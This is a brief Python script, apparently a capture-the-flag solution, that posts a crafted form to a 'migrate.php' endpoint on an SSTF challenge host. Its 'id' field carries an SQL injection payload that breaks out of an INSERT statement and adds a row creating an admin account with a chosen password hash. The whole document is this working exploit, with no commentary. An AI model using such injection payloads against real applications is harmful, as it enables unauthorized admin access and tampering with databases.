import requests
import random

k = random.randint(1, 1000)
print k

cookies = {'id': 'user' + str(k), 'pw': str(k)}
headers = {'Origin': 'http://migration.sstf.site:5555',
           'Content-Type': 'application/x-www-form-urlencoded',
           'Accept': '*/*', 'Referer': 'http://migration.sstf.site:5555/migrate.php',
           }
# asd1asd
data = {
    'id': "qwe1','qwe'),(NULL, 1, admin,'7c087b9499c211984473fdf9fed16cd0')#",
    'pw': "1"
}

print data
response = requests.post('http://migration.sstf.site:5555/migrate.php',
headers = headers, cookies = cookies, data = data, verify = False)

print response
print response.text
